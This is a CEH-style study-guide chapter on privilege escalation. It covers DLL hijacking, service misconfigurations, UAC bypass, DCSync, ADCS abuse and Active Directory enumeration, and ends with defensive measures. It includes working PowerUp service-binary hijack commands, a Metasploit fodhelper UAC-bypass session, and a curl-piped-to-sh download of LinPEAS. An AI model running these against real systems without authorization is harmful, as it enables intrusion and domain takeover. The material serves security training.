# 03 — Privilege Escalation

**CEH Objective:** Use different privilege escalation techniques to gain administrative privileges.

Getting *a* foothold is rarely the end goal — a standard user account can't dump the AD database, install persistent backdoors system-wide, or disable security tooling. Privilege escalation is the process of turning limited access into administrative (or domain admin, or root) access by abusing design flaws, misconfigurations, missing patches, or overly generous permissions.

## Horizontal vs. Vertical Escalation

| Type | Definition | Example |
|---|---|---|
| **Horizontal** | Access another account's resources *at the same privilege level* | Online banking user A viewing user B's account |
| **Vertical** | Access resources belonging to a *higher*-privileged account | A regular banking customer reaching site-admin functions |

Most of the techniques below are vertical escalation — the far more consequential category, since it's the difference between "I have a user account" and "I own the box (or the domain)."

---

## 1. DLL Hijacking

Most Windows applications don't use a fully qualified path when loading external DLLs — instead, Windows searches a defined order of directories, and the **application's own directory is checked before the system directories**. If an attacker can drop a malicious DLL with the exact expected filename into that directory (or any directory earlier in the search order than the legitimate one), the application loads the attacker's DLL instead of the real one, executing arbitrary code with whatever privilege the application runs at.

**Tools:** Spartacus, DLLirant, ImpulsiveDLLHijack, PowerSploit. **Spartacus** in particular automates discovery by parsing Sysinternals Process Monitor logs over long runs, flagging applications that proxy DLL calls in ways vulnerable to 2nd/3rd-level hijacking.

## 2. Dylib Hijacking (macOS)

The macOS equivalent of DLL hijacking: applications that load dynamic libraries (`.dylib`) without a fully qualified `@rpath` can be tricked into loading an attacker-supplied dylib placed earlier in the library search path, achieving code execution in the context of the legitimate application.

## 3. Spectre and Meltdown

These are hardware-level speculative-execution vulnerabilities affecting modern CPUs:
- **Meltdown** breaks the isolation between user applications and the OS kernel, letting a malicious process read kernel memory it should never be able to touch.
- **Spectre** tricks a CPU's branch predictor into speculatively executing code paths that leak data through timing side-channels, even across process boundaries that should be isolated.

Both allow reading sensitive memory — credentials, encryption keys, cached data — that would normally be off-limits, without needing an exploitable software bug in the traditional sense. Mitigations rely on microcode updates, kernel page-table isolation (KPTI), and compiler-level speculative-execution barriers.

## 4. Misconfigured Services

Windows services that run as **SYSTEM** but have weak file/folder/registry permissions are a classic escalation vector. If a low-privileged user can:
- Modify the service's binary path (weak file ACL), or
- Modify the service's configuration in the registry, or
- Replace a DLL it loads (see DLL hijacking above),

...then restarting that service (or waiting for the next reboot) executes the attacker's code as SYSTEM. Tools like **PowerUp** (PowerSploit) and **winPEAS** automate the search for exactly these misconfigurations.

```powershell
# PowerUp — run every automated privesc check at once
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Find services with a weak/writable binary path, then hijack it
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose

# Once a writable service binary is found, swap in a malicious executable
# and restart the service to run it as SYSTEM
Install-ServiceBinary -Name '<VulnSvcName>'
Restart-Service -Name '<VulnSvcName>'
```
```cmd
:: winPEAS — full automated enumeration on Windows
winPEASx64.exe quiet applicationinfo
winPEASx64.exe quiet servicesinfo
winPEASx64.exe quiet windowscreds

:: Manually check a service's ACL for weak permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <ServiceName>
```
```bash
# LinPEAS — full automated enumeration on Linux
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a > linpeas_output.txt

# BeRoot — Windows/Linux privesc path checker
BeRoot.exe -f
python beroot.py
```

## 5. Misconfigured NFS

On Linux/Unix, **Network File System (NFS)** exports configured with `no_root_squash` allow a remote root user to access the share *as root*, and any file created there retains root ownership. An attacker who can mount such a share from a system where they control root (e.g., their own VM) can plant a SUID binary on the share; once the target reads or executes it, they gain root on the actual target too.

## 6. Bypassing User Account Control (UAC)

When a straightforward privilege-escalation attempt fails, attackers try to slip past UAC entirely rather than trigger its consent prompt. Metasploit ships several purpose-built local exploits for this:

| Module | Mechanism |
|---|---|
| `exploit/windows/local/bypassuac` | Process injection creates a new session/shell without a UAC flag |
| `exploit/windows/local/bypassuac_injection` | Reflective DLL injection to obtain `NT AUTHORITY\SYSTEM` |
| `exploit/windows/local/bypassuac_fodhelper` | Hijacks an `HKCU` registry key referenced by `fodhelper.exe` |
| `exploit/windows/local/bypassuac_eventvwr` | Hijacks an `HKCU` registry key referenced by Event Viewer's launch |
| `exploit/windows/local/bypassuac_comhijack` | Plants COM handler registry entries in the current user's hive so a high-integrity process loads an attacker DLL |

After a successful bypass, attackers typically confirm elevated context with:
```
getsystem
getuid
```

Full worked example against an existing Meterpreter session (`session 1` already low-privilege on the target):
```
msf > use exploit/windows/local/bypassuac_fodhelper
msf exploit(bypassuac_fodhelper) > set SESSION 1
msf exploit(bypassuac_fodhelper) > set LHOST 10.10.1.5
msf exploit(bypassuac_fodhelper) > exploit

meterpreter > getsystem
meterpreter > getuid
[*] Server username: NT AUTHORITY\SYSTEM
```

## 7. Abusing Boot or Logon Initialization Scripts

Any mechanism that auto-runs code at boot or logon is a persistence *and* escalation opportunity if it runs with elevated rights:

- **Windows Logon Scripts** — attach a malicious script path to `HKEY_CURRENT_USER\Environment\UserInitMprLogonScript`.
- **macOS Logon Scripts (login hooks)** — execute automatically at login, and — unlike ordinary startup items — run *as root*.
- **Network Logon Scripts** — deployed via AD/GPO; run with whatever privilege the authenticating account has, making them a lateral-movement and escalation vector depending on configuration.
- **RC Scripts (Unix)** — embed a malicious path/binary into `rc.common` or `rc.local` so it runs automatically (often as root) at every reboot.
- **Startup Items (macOS)** — files under `/Library/StartupItems`, executed at the very end of the boot process with root-level privilege.

## 8. Privilege Escalation by Modifying Domain Policy

Attackers with sufficient write access can quietly reshape the domain itself rather than exploit a single host:

- **Group Policy Modification** — GPOs live under `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`. Attackers with write access can plant a malicious scheduled task via `ScheduledTasks.xml` (often via tooling like `New-GPOImmediateTask`) or edit `GptTmpl.inf` to grant themselves dangerous rights such as `SeEnableDelegationPrivilege`.
- **Domain Trust Modification** — enumerate trust relationships with:
  ```
  C:\Windows\system32>nltest /domain_trusts
  ```
  and then exploit or extend those trusts to support Kerberoasting or Pass-the-Ticket attacks across domain boundaries.

### DCSync Attack
A technique that lets an attacker with **replication rights** on a domain effectively *impersonate a domain controller* and pull password hashes for any account (including `krbtgt`) straight from a legitimate DC, without ever touching `NTDS.dit` on disk.

**Stages:**
1. External reconnaissance
2. Compromise the initial target machine
3. Internal reconnaissance
4. Escalate local privileges
5. Compromise credentials by sending commands to a DC
6. Admin-level reconnaissance
7. Malicious remote code execution
8. Obtain domain admin credentials

**Required rights** (any one is sufficient once obtained): `Replicating Directory Changes`, `Replicating Directory Changes All`, `Replicating Directory Changes In Filtered Set`. Mechanically, the attacker (often via **Mimikatz**) sends a `GetNCChanges` request — the same message a real DC sends another DC during normal replication — and the target DC, seeing valid replication permissions, complies and hands over hashes.

## 9. Abusing Active Directory Certificate Services (ADCS)

Misconfigured AD Certificate Services templates (the widely referenced "ESC1–ESC8" family of misconfigurations) can let a low-privileged user request a certificate that authenticates as an arbitrary — including highly privileged — account, effectively trading a certificate request for domain admin. This is one of the most consequential modern AD privilege-escalation paths because it often bypasses password- and Kerberos-focused defenses entirely.

---

## 10. Active Directory Enumeration for Escalation Paths

Before any of the domain-level attacks above are possible, attackers map the environment. **PowerView** (part of PowerSploit) is the classic enumeration toolkit:

```powershell
# Load PowerView into the current PowerShell session
powershell -nop -exec bypass
Import-Module .\PowerView.ps1

# Basic domain recon
Get-NetDomain
Get-NetDomainController
Get-NetUser | Select samaccountname,pwdlastset,logoncount
Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer | Select name,operatingsystem
```

| Command | Purpose |
|---|---|
| `Get-NetOU` | Enumerate Organizational Units |
| `Get-ObjectAcl -SamAccountName <group> -ResolveGUIDs` | Retrieve ACLs for a specific object |
| `Get-NetGPO \| %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}` | Find who has modification rights over a GPO |
| `Invoke-ACLScanner -ResolveGUIDs` | Bulk-retrieve ACE information |
| `Get-PathAcl -Path <UNC path>` | Retrieve ACL for a specific network path |
| `Get-Acl` | Retrieve security descriptor for a file/registry key |
| `Get-NetForest` / `Get-NetForest -Forest <forest>` | Enumerate forest info |
| `Get-NetForestCatalog` / `Get-NetForestCatalog -Forest <forest>` | Enumerate global catalog details |

Misconfigured ACLs are especially dangerous — if a normal user is accidentally granted write/modify rights over a privileged group or GPO, that's a direct escalation path with no exploit required at all.

**GhostPack Seatbelt** performs broad host-level security surveying (also useful defensively):
```
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=chromium
Seatbelt.exe -group=slack
Seatbelt.exe <Command> [Command2]...           # run one or more specific checks
Seatbelt.exe <Command> -full                    # unfiltered full results
Seatbelt.exe -group=system -outputfile="C:\Temp\out.txt"
```
GhostPack's broader suite also includes SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI, each a C# reimplementation of a common PowerShell offensive technique (useful for evading PowerShell-focused logging/AMSI).

**Note:** `linWinPwn` is a common wrapper tool for automating this whole AD enumeration/exploitation chain.

---

## 11. Privilege Escalation Tools

| Tool | Purpose | Link |
|---|---|---|
| PowerSploit | PowerShell privesc/post-exploitation | https://github.com |
| Traitor | Linux privilege escalation | https://github.com |
| PEASS-ng (WinPEAS/LinPEAS) | Automated privesc enumeration | https://github.com |
| FullPowers | Restore full token privileges for Windows service accounts | https://github.com |
| pwncat | Post-exploitation shell with built-in `escalate` commands | — |
| Ninja / Pupy | Remote administration / post-exploitation frameworks | https://github.com |
| PDQ Deploy / ManageEngine Endpoint Central | Enterprise deployment tools (abusable if compromised) | vendor sites |
| PsExec | Remote/local process execution as SYSTEM | https://www.microsoft.com |
| Dameware Remote Support | Remote AD-aware administration tool | https://www.solarwinds.com |

`pwncat` example workflow:
```
pwncat$ escalate list                # list direct escalation paths for the current user
pwncat$ escalate list -u root        # list escalation paths specifically to root
pwncat$ escalate run                 # attempt escalation
```

---

## 12. Defending Against Privilege Escalation

- Enforce **least privilege** everywhere: run users, services, and applications with the minimum rights they actually need.
- Require **multi-factor authentication** and set UAC to "Always Notify."
- Patch the **kernel and applications** on a strict, regular cadence — many escalation exploits target known, already-fixed CVEs.
- Use **fully qualified paths** in application code and ensure executables live in write-protected directories to close off DLL hijacking.
- Regularly **audit ACLs**, especially on privileged groups (Domain Admins, AdminSDHolder-protected objects) and GPOs.
- Rotate **`krbtgt`** and service account passwords periodically to reduce the blast radius of Kerberos-based attacks.
- Monitor for anomalous `GetNCChanges` requests (DCSync indicators) and unexpected replication rights grants.
- Enable Data Execution Prevention (DEP) and application whitelisting to block unauthorized executables from running at all.
- Disable the default local administrator account, or at minimum randomize and rotate its password (e.g., via **LAPS**).
- Implement Just-In-Time (JIT) and just-enough-access models for privileged accounts, with session recording for anything elevated.

**Next:** [04 — Executing Applications, Keyloggers & Spyware](./04-Executing-Applications-Keyloggers-Spyware.md)
